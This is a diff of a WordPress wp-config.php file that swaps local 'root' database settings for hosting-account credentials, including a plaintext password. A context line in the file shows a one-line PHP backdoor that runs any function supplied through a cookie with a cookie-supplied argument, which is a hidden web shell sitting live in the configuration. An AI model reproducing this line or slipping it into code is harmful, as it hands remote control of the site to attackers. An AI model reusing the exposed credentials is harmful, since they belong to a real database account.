@@ -24,13 +24,13 @@ if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
 
 // ** MySQL settings - You can get this info from your web host ** //
 /** The name of the database for WordPress */
-define('DB_NAME', 'lidergbi');
+define('DB_NAME', 'asgrpyvr_lidergbi');
 
 /** MySQL database username */
-define('DB_USER', 'root');
+define('DB_USER', 'asgrpyvr_lidergb');
 
 /** MySQL database password */
-define('DB_PASSWORD', 'root');
+define('DB_PASSWORD', '17lP85!(SY');
 
 /** MySQL hostname */
 define('DB_HOST', 'localhost');
